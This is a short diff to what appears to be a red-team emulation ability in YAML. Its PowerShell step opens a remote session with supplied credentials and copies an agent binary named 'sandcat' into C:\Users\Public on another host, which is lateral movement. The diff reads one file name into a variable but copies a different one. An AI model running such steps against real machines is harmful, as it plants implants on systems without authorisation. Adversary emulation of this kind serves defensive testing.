@@ -16,10 +16,11 @@
           $secstr = New-Object -TypeName System.Security.SecureString;
           $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
           $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-          $File = [System.IO.File]::ReadAllBytes("sandcat.exe");
+          $File = [System.IO.File]::ReadAllBytes("sandcat.go-windows");
           $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-          Copy-Item -Path sandcat.exe -Destination 'C:\Users\Public\' -ToSession $session
-        payload: sandcat.go
+          Copy-Item -Path sandcat.exe -Destination 'C:\Users\Public\' -ToSession $session;
+          Remove-PSSession -Session $session
+        payload: sandcat.go-windows
     darwin:
       sh:
         command: |
